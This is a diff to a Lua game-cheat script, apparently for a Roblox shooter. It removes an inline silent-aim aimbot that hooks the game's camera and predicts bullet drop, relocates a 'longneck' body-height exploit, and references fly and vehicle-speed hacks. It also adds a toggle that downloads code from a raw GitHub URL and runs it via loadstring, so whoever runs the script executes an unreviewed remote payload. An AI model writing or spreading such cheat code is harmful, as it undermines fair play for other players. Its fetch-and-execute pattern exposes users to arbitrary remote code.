@@ -1573,102 +1573,34 @@ updateButtonColor(Xray, xrayEnabled)
 Keybind_2.Text = "None"
 setupSlider(Slider_2, SlidePart_4, TextLabel_16, 10, 1)  
 
-local FOVCircle = Drawing.new("Circle")
-FOVCircle.Visible = true
-FOVCircle.Radius = 80
-FOVCircle.Thickness = 1
-FOVCircle.Filled = false
-FOVCircle.Color = Color3.fromRGB(255, 255, 255)
-FOVCircle.Position = Vector2.new(workspace.CurrentCamera.ViewportSize.X / 2, workspace.CurrentCamera.ViewportSize.Y / 2)
-
-local snapLine = Drawing.new("Line")
-snapLine.Visible = false
-snapLine.Color = Color3.fromRGB(255, 255, 255)
-snapLine.Thickness = 1
-
-local runService = game:GetService("RunService")
-local UserInputService = game:GetService("UserInputService")
-local Classes = getrenv()._G.classes
-local CameraClient = Classes.Camera
-local FPSClient = Classes.FPS
-local Camera = cloneref(game:GetService("Workspace").CurrentCamera)
-
-local validGuns = {
-    "AR15", "C9", "Crossbow", "Bow", "EnergyRifle", "GaussRifle",
-    "HMAR", "KABAR", "LeverActionRifle", "M4A1", "PipePistol",
-    "PipeSMG", "PumpShotgun", "SCAR", "SVD", "USP9", "UZI", "Blunderbuss"
+local longneck = {
+    LongNeckEnabled = false,
+    UpperLimitDefault = 7,
+    LowerLimitDefault = 2.89,
+    EnabledHeight = 8,
+    DisabledHeight = 2.89,
 }
 
-local isSilentAimEnabled = false
-local currentSilentAimKeybind = nil
-local listeningForSilentAimKeybind = false
+local UserInputService = game:GetService("UserInputService")
+local Workspace = game:GetService("Workspace")
+local LocalCharacter = Workspace.Ignore.LocalCharacter
+local PrismaticConstraint = LocalCharacter.Bottom.PrismaticConstraint
 
-function IsValidGun(gun)
-    return table.find(validGuns, tostring(gun)) ~= nil
-end
-
-function GetClosestTarget(maxDistance)
-    local closestTarget, targetVelocity, closestDistance = nil, nil, math.huge
-    for i, v in next, Classes.Player.EntityMap do
-        if (v.type == "Player" or v.type == "Soldier") and not v.sleeping and v.model:FindFirstChild("HumanoidRootPart") then
-            local distanceToPlayer = (v.model.HumanoidRootPart.Position - Camera.CFrame.Position).Magnitude
-            local screenPoint = Camera:WorldToViewportPoint(v.model.Head.Position)
-            local center = Vector2.new(Camera.ViewportSize.X / 2, Camera.ViewportSize.Y / 2)
-            local distanceFromCenter = (Vector2.new(screenPoint.X, screenPoint.Y) - center).Magnitude
-            if distanceToPlayer <= maxDistance and distanceFromCenter <= FOVCircle.Radius and distanceToPlayer < closestDistance then
-                closestTarget = v.model
-                targetVelocity = v.velocityVector
-                closestDistance = distanceToPlayer
-            end
-        end
-    end
-    return closestTarget, targetVelocity
-end
-
-function CalculateBulletDrop(tPos, tVel, cPos, pSpeed, pDrop)
-    local dTT = (tPos - cPos).Magnitude
-    local tTT = dTT / pSpeed
-    local sVE = 8.8 - (pSpeed / (400 + pSpeed / 35))
-    local horizontalVel = Vector3.new(tVel.X, 0, tVel.Z) * 6.9
-    local verticalVel = Vector3.new(0, tVel.Y, 0) * 3
-    local adjustedVel = horizontalVel + verticalVel
-    local pTP = tPos + (adjustedVel * tTT)
-    local dP = -pDrop ^ (tTT * pDrop) + 3
-    local pPWD = pTP - Vector3.new(0, dP, 0)
-    return pPWD
-end
-
-local oldGetCFrame = CameraClient.GetCFrame
-CameraClient.GetCFrame = function()
-    if isSilentAimEnabled then
-        local closest, velocityVector = GetClosestTarget(1000)
-        local equippedData = FPSClient.GetEquippedItem()
-        if equippedData and closest and closest:FindFirstChild("HumanoidRootPart") and IsValidGun(equippedData.type) then
-            local itemClass = Classes[equippedData.type]
-            if itemClass then
-                local projectileSpeed = itemClass.ProjectileSpeed
-                local projectileDrop = itemClass.ProjectileDrop
-                local predictedPosition = CalculateBulletDrop(closest.Head.Position, velocityVector, Camera.CFrame.Position, projectileSpeed, projectileDrop)
-                return CFrame.new(Camera.CFrame.Position, predictedPosition)
-            end
-        end
-    end
-    return oldGetCFrame()
-end
-
-runService.RenderStepped:Connect(function(deltaTime)
-    FOVCircle.Position = Vector2.new(workspace.CurrentCamera.ViewportSize.X / 2, workspace.CurrentCamera.ViewportSize.Y / 2)
-
-    local closest, _ = GetClosestTarget(1000)
-    if closest and closest:FindFirstChild("Head") then
-        local headPosition = Camera:WorldToViewportPoint(closest.Head.Position)
-        snapLine.From = FOVCircle.Position
-        snapLine.To = Vector2.new(headPosition.X, headPosition.Y)
-        snapLine.Visible = true
+local function updateLimits()
+    if longneck.LongNeckEnabled then
+        PrismaticConstraint.UpperLimit = longneck.EnabledHeight
+        PrismaticConstraint.LowerLimit = longneck.EnabledHeight
     else
-        snapLine.Visible = false
+        PrismaticConstraint.UpperLimit = longneck.UpperLimitDefault
+        PrismaticConstraint.LowerLimit = longneck.LowerLimitDefault
     end
-end)
+end
+
+local function toggleLongneck()
+    longneck.LongNeckEnabled = not longneck.LongNeckEnabled
+    updateButtonColor(Longneck, longneck.LongNeckEnabled)
+    updateLimits()
+end
 
 local function updateButtonColor(button, isEnabled)
     if isEnabled then
@@ -1678,38 +1610,38 @@ local function updateButtonColor(button, isEnabled)
     end
 end
 
+local currentLongneckKeybind = nil
+local listeningForLongneckKeybind = false
+
 local function setKeybind(key, picker, listener)
     if picker == Keybind then
-        currentSilentAimKeybind = key
+        currentLongneckKeybind = key
     end
     picker.Text = key.Name
     listener = false
 end
 
 Keybind.MouseButton1Click:Connect(function()
-    listeningForSilentAimKeybind = true
+    listeningForLongneckKeybind = true
     Keybind.Text = "..."
 end)
 
 UserInputService.InputBegan:Connect(function(input, gameProcessed)
     if not gameProcessed then
-        if listeningForSilentAimKeybind then
-            setKeybind(input.KeyCode, Keybind, listeningForSilentAimKeybind)
-            listeningForSilentAimKeybind = false
-        elseif input.KeyCode == currentSilentAimKeybind then
-            isSilentAimEnabled = not isSilentAimEnabled
-            updateButtonColor(Silent, isSilentAimEnabled)
+        if listeningForLongneckKeybind then
+            setKeybind(input.KeyCode, Keybind, listeningForLongneckKeybind)
+            listeningForLongneckKeybind = false
+        elseif input.KeyCode == currentLongneckKeybind then
+            toggleLongneck()
         end
     end
 end)
 
-Silent.MouseButton1Click:Connect(function()
-    isSilentAimEnabled = not isSilentAimEnabled
-    updateButtonColor(Silent, isSilentAimEnabled)
+Longneck.MouseButton1Click:Connect(function()
+    toggleLongneck()
 end)
 
--- Initialize the button color
-updateButtonColor(Silent, isSilentAimEnabled)
+updateButtonColor(Longneck, longneck.LongNeckEnabled)
 
 local RunService = game:GetService("RunService")
 local UserInputService = game:GetService("UserInputService")
@@ -1929,7 +1861,6 @@ end
 
 setupSlider(SliderAtv, SlidePart_5, TextLabel_19, MAX_SPEED, 1)
 
--- Initialize the button color
 updateButtonColor(Atv, Enabled)
 
 FlyHack()
@@ -1978,34 +1909,29 @@ task.spawn(function()
     end
 end)
 
-local longneck = {
-    LongNeckEnabled = false,
-    UpperLimitDefault = 7,
-    LowerLimitDefault = 2.89,
-    EnabledHeight = 8,
-    DisabledHeight = 2.89,
-}
-
-local UserInputService = game:GetService("UserInputService")
-local Workspace = game:GetService("Workspace")
-local LocalCharacter = Workspace.Ignore.LocalCharacter
-local PrismaticConstraint = LocalCharacter.Bottom.PrismaticConstraint
-
-local function updateLimits()
-    if longneck.LongNeckEnabled then
-        PrismaticConstraint.UpperLimit = longneck.EnabledHeight
-        PrismaticConstraint.LowerLimit = longneck.EnabledHeight
-    else
-        PrismaticConstraint.UpperLimit = longneck.UpperLimitDefault
-        PrismaticConstraint.LowerLimit = longneck.LowerLimitDefault
+local function executeLoadstringFromUrl(url)
+    local success, err = pcall(function()
+        local scriptToRun = loadstring(game:HttpGet(url))()
+        if scriptToRun then
+            scriptToRun()
+        end
+    end)
+    if not success then
+        warn("Error loading script: " .. err)
     end
 end
 
-local function toggleLongneck()
-    longneck.LongNeckEnabled = not longneck.LongNeckEnabled
-    updateButtonColor(Longneck, longneck.LongNeckEnabled)
-    updateLimits()
+local function toggleSilent()
+    isSilentEnabled = not isSilentEnabled
+    updateButtonColor(Silent, isSilentEnabled)
+    if isSilentEnabled then
+        executeLoadstringFromUrl('https://raw.githubusercontent.com/ph2p12z/2/refs/heads/main/saaa')
+    end
 end
+
+Silent.MouseButton1Click:Connect(function()
+    toggleSilent()
+end)
 
 local function updateButtonColor(button, isEnabled)
     if isEnabled then
@@ -2015,35 +1941,4 @@ local function updateButtonColor(button, isEnabled)
     end
 end
 
-local currentLongneckKeybind = nil
-local listeningForLongneckKeybind = false
-
-local function setKeybind(key, picker, listener)
-    if picker == Keybind then
-        currentLongneckKeybind = key
-    end
-    picker.Text = key.Name
-    listener = false
-end
-
-Keybind.MouseButton1Click:Connect(function()
-    listeningForLongneckKeybind = true
-    Keybind.Text = "..."
-end)
-
-UserInputService.InputBegan:Connect(function(input, gameProcessed)
-    if not gameProcessed then
-        if listeningForLongneckKeybind then
-            setKeybind(input.KeyCode, Keybind, listeningForLongneckKeybind)
-            listeningForLongneckKeybind = false
-        elseif input.KeyCode == currentLongneckKeybind then
-            toggleLongneck()
-        end
-    end
-end)
-
-Longneck.MouseButton1Click:Connect(function()
-    toggleLongneck()
-end)
-
-updateButtonColor(Longneck, longneck.LongNeckEnabled)
+updateButtonColor(Silent, isSilentEnabled)
